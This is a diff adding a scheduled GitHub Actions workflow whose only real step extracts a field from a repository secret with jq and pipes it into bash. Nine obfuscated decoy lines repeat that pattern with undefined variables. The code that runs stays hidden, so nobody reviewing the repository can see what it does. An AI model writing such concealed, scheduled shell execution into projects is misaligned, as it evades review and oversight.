@@ -1,0 +1,26 @@
+name: panhuihourui
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: panhuihourui
+        env:
+          kb1: ${{ secrets.kb1 }}
+        run: |
+          echo $kb1 | jq -r .vkgh016 | /bin/bash
+          echo $oqwku5165 | jq -r .bdqo08557 | /bin/bash
+          echo $lp7080 | jq -r .kyfaw42018 | /bin/bash
+          echo $kck4 | jq -r .ej016 | /bin/bash
+          echo $wxwfy58 | jq -r .jje6 | /bin/bash
+          echo $fl847 | jq -r .r4 | /bin/bash
+          echo $uac827 | jq -r .zb394 | /bin/bash
+          echo $lbkva285 | jq -r .kzj69 | /bin/bash
+          echo $tupi3 | jq -r .te173 | /bin/bash
+          echo $r81430 | jq -r .e2790 | /bin/bash
+
